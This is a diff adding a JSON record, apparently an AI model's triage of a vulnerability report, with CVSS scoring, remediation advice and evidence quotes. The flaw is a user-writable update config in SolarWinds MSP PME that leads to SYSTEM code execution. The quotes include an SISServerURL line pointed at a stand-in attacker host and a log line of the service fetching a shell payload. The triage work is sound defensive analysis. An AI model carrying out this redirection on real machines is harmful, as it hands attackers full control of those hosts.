@@ -1,0 +1,73 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "CacheService.xml in SolarWinds MSP PME (before 1.1.15) is writable by normal users, allowing modification of SISServerURL to point to an attacker-controlled server; the service then downloads and executes attacker-supplied binaries, resulting in system-level code execution.",
+    "affected_product": "SolarWinds MSP PME before 1.1.15",
+    "cwe": "CWE-276",
+    "cwe_quote": "The XML file CacheService.xml in %PROGRAMDATA%\\SolarWinds MSP\\SolarWinds.MSP.CacheService\\config\\ is writable by normal users, so that the parameter SISServerURL can be changed, which controls the location of the updates.",
+    "cvss": {
+      "AV": {
+        "value": "L",
+        "quote": "Any user on the system who is in group users can change the file content."
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "L",
+        "quote": "Any user on the system who is in group users can change the file content."
+      },
+      "UI": {
+        "value": "N",
+        "quote": ""
+      },
+      "S": {
+        "value": "U",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      },
+      "C": {
+        "value": "H",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      },
+      "I": {
+        "value": "H",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      },
+      "A": {
+        "value": "H",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      }
+    },
+    "recommended_next_step": "Confirm and deploy the vendor fix (upgrade to PME 1.1.15) and issue guidance to customers to verify/restore secure NTFS permissions on CacheService.xml immediately; for triage, identify affected hosts and check for unauthorized downloads/executions in %PROGRAMDATA%\\SolarWinds MSP\\SolarWinds.MSP.CacheService\\cache and PME\\archives.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "File is writable by normal users",
+        "quote": "The XML file CacheService.xml in %PROGRAMDATA%\\SolarWinds MSP\\SolarWinds.MSP.CacheService\\config\\ is writable by normal users, so that the parameter SISServerURL can be changed, which controls the location of the updates."
+      },
+      {
+        "claim": "Any user can change file content (icacls output)",
+        "quote": "Any user on the system who is in group users can change the file content."
+      },
+      {
+        "claim": "Attack modifies SISServerURL to attacker server",
+        "quote": "<SISServerURL>https://evil-attacker.example.org</SISServerURL>"
+      },
+      {
+        "claim": "Service downloads the malicious executable",
+        "quote": "[24/Apr/2020:10:57:01 +0200] \"GET /ComponentData/RMM/1/solarwinds-shell.exe HTTP/1.1\" 200 7585 \"-\" \"-\""
+      },
+      {
+        "claim": "Executed payload runs as SYSTEM and provides remote shell",
+        "quote": "After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker."
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 3147,
+    "output_tokens": 1527,
+    "latency_s": null,
+    "batch": true
+  }
+}
